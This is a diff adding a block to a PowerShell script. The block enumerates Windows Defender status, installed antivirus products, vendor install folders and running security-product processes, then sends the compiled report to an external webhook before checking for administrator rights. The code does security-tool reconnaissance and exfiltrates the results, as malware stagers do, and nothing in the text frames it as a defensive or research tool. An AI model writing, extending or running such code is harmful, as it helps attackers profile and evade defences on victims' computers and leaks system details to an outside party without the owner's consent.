@@ -14,6 +14,107 @@ function Send-WebhookMessage {
 Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 
 try {
+    $DefenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
+    $DefenderStatus = if ($DefenderService) { $DefenderService.Status } else { 'Not Installed' }
+
+    $DefenderRealtime = try { Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring } catch { 'Unavailable' }
+
+    $InstalledAV = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntiVirusProduct" | 
+        Select-Object displayName, productState, pathToSignedProductExe
+
+    $DefenderExe = Get-Command "C:\Program Files\Windows Defender\MsMpEng.exe" -ErrorAction SilentlyContinue
+    $DefenderExeStatus = if ($DefenderExe) { 'Yes' } else { 'No' }
+
+    $WinDefendReg = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -ErrorAction SilentlyContinue
+    $RegStatus = if ($WinDefendReg) { 'Yes' } else { 'No' }
+
+    $avInfo = if ($InstalledAV) {
+        ($InstalledAV | ForEach-Object { 
+            $state = switch ($_.'productState') {
+                397568 { 'Enabled' }
+                266240 { 'Disabled' }
+                Default { $_.'productState' }
+            }
+            "- $($_.displayName) | Status: $state | Path: $($_.pathToSignedProductExe)"
+        }) -join "`n"
+    } else { "- None detected" }
+
+    $knownAVPaths = @(
+        "$env:ProgramFiles\AVAST Software", "$env:ProgramFiles(x86)\AVAST Software",
+        "$env:ProgramFiles\AVG", "$env:ProgramFiles(x86)\AVG",
+        "$env:ProgramFiles\Avira", "$env:ProgramFiles(x86)\Avira",
+        "$env:ProgramFiles\Bitdefender", "$env:ProgramFiles(x86)\Bitdefender",
+        "$env:ProgramFiles\Kaspersky Lab", "$env:ProgramFiles(x86)\Kaspersky Lab",
+        "$env:ProgramFiles\Malwarebytes", "$env:ProgramFiles(x86)\Malwarebytes",
+        "$env:ProgramFiles\McAfee", "$env:ProgramFiles(x86)\McAfee",
+        "$env:ProgramFiles\Norton", "$env:ProgramFiles(x86)\Norton",
+        "$env:ProgramFiles\ESET", "$env:ProgramFiles(x86)\ESET",
+        "$env:ProgramFiles\Trend Micro", "$env:ProgramFiles(x86)\Trend Micro",
+        "$env:ProgramFiles\Panda Security", "$env:ProgramFiles(x86)\Panda Security",
+        "$env:ProgramFiles\Sophos", "$env:ProgramFiles(x86)\Sophos",
+        "$env:ProgramFiles\F-Secure", "$env:ProgramFiles(x86)\F-Secure",
+        "$env:ProgramFiles\Webroot", "$env:ProgramFiles(x86)\Webroot",
+        "$env:ProgramFiles\Comodo", "$env:ProgramFiles(x86)\Comodo",
+        "$env:ProgramFiles\VIPRE", "$env:ProgramFiles(x86)\VIPRE",
+        "$env:ProgramFiles\Cylance", "$env:ProgramFiles(x86)\Cylance",
+        "$env:ProgramFiles\Carbon Black", "$env:ProgramFiles(x86)\Carbon Black",
+        "$env:ProgramFiles\CrowdStrike", "$env:ProgramFiles(x86)\CrowdStrike",
+        "$env:ProgramFiles\DrWeb", "$env:ProgramFiles(x86)\DrWeb",
+        "$env:ProgramFiles\Symantec", "$env:ProgramFiles(x86)\Symantec",
+        "$env:ProgramFiles\ZoneAlarm", "$env:ProgramFiles(x86)\ZoneAlarm",
+        "$env:ProgramFiles\Adaware", "$env:ProgramFiles(x86)\Adaware",
+        "$env:ProgramFiles\VIPRE Security", "$env:ProgramFiles(x86)\VIPRE Security",
+        "$env:ProgramFiles\Windows Defender Advanced Threat Protection",
+        "$env:ProgramFiles(x86)\Windows Defender Advanced Threat Protection"
+    )
+
+    $pathAVs = @()
+    foreach ($path in $knownAVPaths) {
+        if (Test-Path $path) { $pathAVs += $path }
+    }
+
+    $pathAVsInfo = if ($pathAVs) { $pathAVs -join "`n" } else { "- None detected" }
+
+    $avProcessPatterns = @(
+        'avast','avg','avira','bitdefender','kaspersky','malwarebytes','mcafee','norton','eset','trend','panda',
+        'sophos','f-secure','webroot','comodo','vipre','cylance','carbonblack','crowdstrike','drweb','symantec',
+        'zonealarm','adaware','defender','windows defender','eicar','vipre security','malwarebytes','malwarebytes3'
+    )
+
+    $runningAVProcesses = Get-Process | Where-Object { 
+        $name = $_.ProcessName.ToLower()
+        $falseFound = $false
+        foreach ($pattern in $avProcessPatterns) {
+            if ($name -like "*$pattern*") { $falseFound = $true }
+        }
+        $falseFound
+    } | Select-Object -Property ProcessName, Id, Path -ErrorAction SilentlyContinue
+
+    $runningAVInfo = if ($runningAVProcesses) {
+        ($runningAVProcesses | ForEach-Object { "- $($_.ProcessName) | PID: $($_.Id) | Path: $($_.Path)" }) -join "`n"
+    } else { "- None detected" }
+
+
+    $message = @"
+=== Windows Defender Info ===
+Service Status: $DefenderStatus
+Real-Time Protection Disabled: $DefenderRealtime
+Defender Executable Found: $DefenderExeStatus
+Defender Registered in Registry: $RegStatus
+Installed Antivirus Products (Security Center):
+    $avInfo
+
+Installed Antivirus Products (By Path):
+    $pathAVsInfo
+
+Running Antivirus Processes:
+    $runningAVInfo
+"@
+
+    Send-WebhookMessage -Message $message
+
+
+    
     $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
     $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
     if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
